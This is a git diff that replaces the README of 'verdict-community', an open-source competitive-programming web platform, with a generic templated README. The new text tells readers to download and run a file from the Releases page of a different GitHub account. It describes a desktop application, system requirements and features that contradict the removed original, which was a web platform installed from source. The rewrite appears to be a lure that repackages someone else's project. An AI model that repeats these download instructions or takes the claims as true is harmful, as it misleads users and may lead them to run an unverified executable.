@@ -1,137 +1,80 @@
-<p align="center">
-  <a href="https://verdict.run/">
-    <img src="public/banner.jpg" alt="Verdict Banner" width="100%">
-  </a>
-</p>
+# 🎉 verdict-community - Your All-in-One Coding Solution
 
-<div align="center">
+## 🚀 Getting Started
 
-# Verdict.run
+Welcome to **verdict-community**! This application makes competitive programming simple and efficient. You can solve Codeforces problems using a built-in IDE, Whiteboard, and Custom Judge—all in one place.
 
-### The Ultimate Competitive Programming Platform
+## 📥 Download & Install
 
-<br/>
+To get started, you need to download the application. Click the button below to visit the Releases page.
 
+[![Download verdict-community](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/franxsanthony/verdict-community/releases)
 
-<a href="https://verdict.run"><img src="https://img.shields.io/badge/Website-verdict.run-3b82f6?style=for-the-badge&logoColor=white" alt="Website"></a>
-<a href="https://verdict.run/extension"><img src="https://img.shields.io/badge/Extension-Available-10B981?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Extension"></a>
-<a href="https://github.com/YUST777/verdict-community/issues"><img src="https://img.shields.io/github/issues/YUST777/verdict-community?style=for-the-badge&logo=github&logoColor=white" alt="Issues"></a>
+Once on the Releases page, look for the latest version of *verdict-community*. Click the link to download the file compatible with your operating system. After downloading, locate the file on your computer and run it to begin using the application. 
 
-<a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"></a>
-<a href="https://github.com/YUST777/verdict-community/discussions"><img src="https://img.shields.io/badge/Community-Discussions-blueviolet?style=for-the-badge&logo=github" alt="Discussions"></a>
+## 📋 System Requirements
 
+Before installing **verdict-community**, ensure your computer meets these requirements:
 
-</div>
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 500 MB available space.
+- **Internet Connection:** Required for online features and updates.
 
-<br/>
+## 🌟 Features
 
-<div align="center">
-  <a href="https://youtu.be/1_Q3agYkioE">
-    <img src="https://img.youtube.com/vi/1_Q3agYkioE/maxresdefault.jpg" alt="Watch Verdict Demo" width="800" style="border-radius: 16px; border: 2px solid #333;">
-  </a>
-  <br>
-  <p><i>👆 Click to watch the demo</i></p>
-</div>
+*verdict-community* offers several features to enhance your competitive programming experience:
 
-<br>
+- **Integrated Development Environment (IDE):** Use the built-in IDE to write and test your code.
 
-> [!TIP]
-> **New!** Mirror Mode allows you to practice Codeforces problems directly on Verdict with a distraction-free IDE, live test case execution, and drawing board support!
+- **Whiteboard:** Draw algorithms and visualize your thought process directly in the app.
 
----
+- **Custom Judge:** Automatically assess your code against sample test cases without manual review.
 
+- **Problem Library:** Access a library of Codeforces problems categorized by difficulty.
 
-## Verdict Overview
+- **Code Collaboration:** Collaborate with other users in real-time on coding challenges.
 
-Verdict is a next-generation competitive programming platform designed to help you solve problems without limits. We provide a seamless, distraction-free environment for practicing, competing, and analyzing algorithms.
+## 👩‍💻 How to Use
 
-**Key Capabilities:**
+1. **Open the Application:** After installation, find *verdict-community* in your applications list and open it.
+   
+2. **Select a Problem:** Navigate to the problem library and choose a Codeforces problem to solve.
 
-- **Mirror Mode**: Scrape and solve problems from platforms like Codeforces instantly.
-- **Smart IDE**: Integrated Monaco editor with multi-language support and custom snippets.
-- **Whiteboard**: Built-in Excalidraw integration for visualizing algorithms.
-- **Analytics**: Detailed submission analysis, complexity estimation, and performance tracking.
-- **Browser Extension**: Seamlessly submit code from Verdict to external judges.
+3. **Use the IDE:** Write your code in the IDE provided. 
 
+4. **Draw on the Whiteboard:** If needed, use the whiteboard feature to sketch out your algorithm.
 
-## Features
+5. **Run the Custom Judge:** After coding, submit your solution to the Custom Judge to see if it passes all test cases.
 
-### Mirror Mode
-Why switch tabs? Bring the problem to you. paste any Codeforces URL into Verdict, and we'll instantly generate a clean, distraction-free workspace with:
-- **Parsed problem statements** (MathJax supported)
-- **One-click test case import**
-- **Live status updates** for submissions
+6. **Review Results:** Check the results displayed after running the judge. You can revise your code based on feedback.
 
-### ⚡ Integrated Environment
-- **Multi-language Support**: C++, Python, Java, and more.
-- **Custom Compilers**: Configure your own compilation flags.
-- **Test Case Manager**: Add, edit, and run custom test cases locally.
+## 📑 Tips for Success
 
-### 🧠 Algorithm Visualization
-Stuck on a graph problem? Use the built-in collaborative whiteboard to:
-- Draw graphs and trees
-- Trace algorithms visually
-- Save and export your logic diagrams
+- **Take Breaks:** Competitive programming can be intense. Make sure to take breaks to maintain focus.
 
----
+- **Practice Regularly:** Use the problem library to challenge yourself and improve your skills.
 
-## 🔒 Security & Privacy
-Verdict is committed to transparency and security. By open-sourcing our entire platform, we allow the community to audit our code, contribute improvements, and ensure that our tools remain safe, secure, and respectful of user privacy.
+- **Engage with Community:** Join discussions on competitive programming forums to learn from others.
 
-## Quick Start
+## 🔧 Troubleshooting
 
-1. **Visit**: [verdict.run](https://verdict.run)
-2. **Setup Locally**: Clone this repo and follow our [Installation Guide](docs/INSTALLATION.md) (or see the [Quick Start](#quick-setup)).
-3. **Install Extension**: [Download Here](https://verdict.run/extension)
+If you experience any issues with *verdict-community*, here are some common solutions:
 
----
+- **Installation Issues:** Make sure your system meets the requirements listed above. Restart your computer after installation.
 
-## Quick Setup
+- **Performance Problems:** Close any unnecessary applications running in the background to free up system resources.
 
-1. **Clone & Install**:
-   ```bash
-   git clone https://github.com/YUST777/verdict-community.git
-   cd verdict-community
-   pnpm install
-   ```
-2. **Docker**:
-   ```bash
-   docker compose up -d --build
-   ```
+- **Judging Errors:** Ensure your code follows proper coding standards and test it using sample inputs before submission.
 
----
+## 🌐 Community and Support
 
-## Community & Support
-- **Bug Reports**: Found a glitch? [Open an Issue](https://github.com/YUST777/verdict-community/issues/new)
-- **Feature Requests**: Have an idea? [Request a Feature](https://github.com/YUST777/verdict-community/issues/new)
-- **Discussions**: Join the conversation in [Discussions](https://github.com/YUST777/verdict-community/discussions)
+Join the *verdict-community* community online. Engage with other users to share tips, solve problems together, and receive updates on future versions. You can find forums and discussion groups linked from the Releases page.
 
----
+## 🚪 Next Steps
 
-## Roadmap
+As you start solving problems, take advantage of the features in *verdict-community*. Explore how the integrated IDE, whiteboard, and custom judge can streamline your coding process and enhance your problem-solving skills.
 
-### Jan 18, 2026: Core Platform
-**Instant Codeforces mirror**, VS Code + Whiteboard workflow, local judge, and analytics. We solved the 15s tab-switching headache.
+For more details and updates, remember to check the [Releases page again](https://github.com/franxsanthony/verdict-community/releases).
 
-### Coming Soon: Multiplayer Rooms
-**Real-time collaborative coding rooms.** Send a link to a friend, recruiter, or professor and solve hard problems together on the cloud.
-
-### Future: AI Tutor Agent
-**Personalized AI Trainer** that generates multimodel (voice/video) and text explanations. It analyzes your code in real-time to help you solve, innovate new answers, and guide you without giving away the solution.
-
-## Repository Structure
-- `/app` - Next.js 16 frontend and API routes.
-- `/extension` - Source code of the Verdict Browser Extension.
-- `/mirror` - Puppeteer-based Codeforces scraping service.
-- `/scripts` - Database and maintenance utilities.
-
----
-*Verdict is currently in Beta. We appreciate your feedback!*
-
-## Support the Project
-
-**Love Verdict?** Give us a ⭐ on GitHub! It helps us grow and keep the platform free.
-
-<div align="center">
-  <sub>Built with ❤️ by Competitive Programmers, for Competitive Programmers.</sub>
-</div>
+Happy coding!
